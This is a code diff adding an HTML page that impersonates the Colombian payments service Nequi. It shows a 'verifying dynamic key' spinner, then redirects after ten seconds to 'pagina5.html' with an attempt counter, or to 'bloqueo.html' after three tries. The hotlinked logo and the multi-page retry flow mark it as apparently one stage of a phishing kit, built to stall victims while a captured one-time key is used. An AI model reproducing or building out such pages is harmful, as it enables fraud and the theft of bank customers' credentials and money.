@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Verificando clave</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .loading-container {
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+        }
+        .logo {
+            margin-bottom: 50px;
+        }
+        .logo img {
+            width: 80px;
+            height: auto;
+        }
+        h2 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #21002b;
+            margin-bottom: 12px;
+        }
+        p {
+            font-size: 17px;
+            color: #666;
+            margin-bottom: 50px;
+        }
+        .spinner-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+        .spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid #f0e6ff;
+            border-top-color: #ff008c;
+            border-radius: 50%;
+            animation: spin 1.2s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .progress-text {
+            color: #999;
+            font-size: 15px;
+            margin-top: 20px;
+        }
+        .footer-note {
+            margin-top: 60px;
+            color: #bbb;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo">
+            <img src="https://i.ibb.co/HDycgPYf/nequi.png" alt="Nequi Logo">
+        </div>
+        
+        <h2>Verificando clave dinámica</h2>
+        
+        <p>Esto tomará solo unos segundos...</p>
+        
+        <div class="spinner-container">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="progress-text">
+            Validando información
+        </div>
+        
+        <div class="footer-note">
+            Nequi © 2024
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const intento = parseInt(urlParams.get('intento')) || 1;
+        
+        setTimeout(() => {
+            if (intento >= 3) {
+                window.location.href = 'bloqueo.html';
+            } else {
+                window.location.href = `pagina5.html?intento=${intento}`;
+            }
+        }, 10000);
+    </script>
+</body>
+</html>
